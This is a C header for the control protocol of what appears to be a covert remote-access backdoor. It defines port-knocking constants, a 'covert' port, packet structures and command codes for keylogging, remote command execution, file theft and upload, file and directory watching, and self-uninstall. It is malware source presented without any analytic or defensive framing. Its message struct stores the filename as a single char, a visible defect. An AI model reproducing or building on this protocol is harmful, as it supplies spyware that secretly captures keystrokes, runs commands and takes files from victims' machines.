#ifndef PROTOCOL_H
#define PROTOCOL_H

#include <stddef.h>
#include <stdint.h>

#define KNOCK_PORT_COUNT 3
#define KNOCK_PORT_BASE 5001
#define KNOCK_TIMEOUT_MS 2000
#define COLLECTOR_PORT 9999
#define COVERT_PORT 7777
#define RESPONSE_TIMEOUT_MS 5000

#define PACKET_SIZE_MAX 1400
#define CHECKSUM_SIZE 2
#define FILE_CHUNK 512
#define LOCAL_PATH_MAX 1024
#define REMOTE_PATH_MAX 512

#define CMD_DISCONNECT    0x01
#define CMD_HEARTBEAT     0x02
#define CMD_KEYLOG_START  0x10
#define CMD_KEYLOG_STOP   0x11
#define CMD_EXEC_CMD      0x30
#define CMD_EXEC_OUTPUT   0x31
#define CMD_FILE_GET      0x40
#define CMD_FILE_DATA     0x41
#define CMD_FILE_PUT_BEGIN 0x42
#define CMD_FILE_PUT_CHUNK 0x43
#define CMD_FILE_PUT_END   0x44
#define CMD_WATCH_FILE    0x50
#define CMD_WATCH_DIR     0x51
#define CMD_UNINSTALL     0xFE

#define CMD_OK    0xF0
#define CMD_ERROR 0xF1
#define CMD_ACK   0xF2

#define MSG_DIRECTORY_EVENT 1
#define MSG_FILE_DATA       2
#define MSG_COMMAND_OUTPUT  3

#define SEQ_INIT 0x13370000u

#define PROTOCOL_PACKET_PAYLOAD_MAX (PACKET_SIZE_MAX - sizeof(covert_header_t) - CHECKSUM_SIZE)

#if defined(__GNUC__) || defined(__clang__)
#define PROTOCOL_PACKED __attribute__((packed))
#else
#define PROTOCOL_PACKED
#endif

typedef struct PROTOCOL_PACKED {
    uint32_t seq_num;
    uint8_t command;
    uint16_t payload_len;
} covert_header_t;

typedef struct {
    uint32_t seq_num;
    uint8_t command;
    uint16_t payload_len;
    const uint8_t *payload;
} parsed_packet_t;

typedef struct {
    int message_type;
    char filename;
    char payload[FILE_CHUNK];
    int payload_len;
} network_message_t;

uint16_t protocol_compute_checksum(const uint8_t *data, size_t len);
int protocol_parse_packet(const uint8_t *packet, size_t packet_len, parsed_packet_t *parsed, char *error, size_t error_len);
size_t protocol_build_packet(
    uint32_t seq_num,
    uint8_t command,
    const uint8_t *payload,
    uint16_t payload_len,
    uint8_t *packet,
    size_t packet_size,
    char *error,
    size_t error_len
);
const char *protocol_command_name(uint8_t command);

#endif
